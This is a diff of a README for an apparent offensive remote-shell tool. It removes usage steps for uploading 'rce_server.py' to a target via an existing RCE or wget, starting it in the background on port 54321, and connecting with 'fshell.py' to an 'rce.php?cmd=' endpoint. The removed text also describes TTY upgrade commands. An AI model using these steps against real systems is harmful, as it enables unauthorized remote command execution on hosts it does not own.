@@ -66,53 +66,7 @@ python3 fshell.py http://target:54321/rce.php?cmd=%s
 
 </div>
 
----
 
-## 🚀 Usage
-
-### Prerequisites
-
-| Component | Requirements |
-|-----------|-------------|
-| **Target** | Python 3 (any version) |
-| **Attacker** | Python 3 + `requests` + `termcolor` |
-
-```bash
-pip install requests termcolor
-```
-
-### Step 1 — Deploy on Target
-
-Upload `rce_server.py` to the target (via your RCE, file upload, wget, etc.) and run:
-
-```bash
-python3 rce_server.py
-```
-
-### Step 2 — Connect from Your Machine
-
-```bash
-python3 fshell.py http://target-ip:54321/rce.php?cmd=%s
-```
-
-### Shell Commands
-
-| Command | Description |
-|---------|-------------|
-| `upgrade_shell` | Spawn a full TTY with PTY, TERM, and aliases |
-| `get_sessid` | Show current session ID |
-| `exit_shell` | Gracefully exit and clean up temp files |
-| `help_shell` | Show available commands |
-
-### ⚙️ setup.sh
-
-The included `setup.sh` script automates deployment:
-
-```bash
-bash setup.sh
-```
-
-It clones (or pulls) the repo into `~/.fwdsh` and starts `rce_server.py` in the background on port 54321.
 
 ---
 
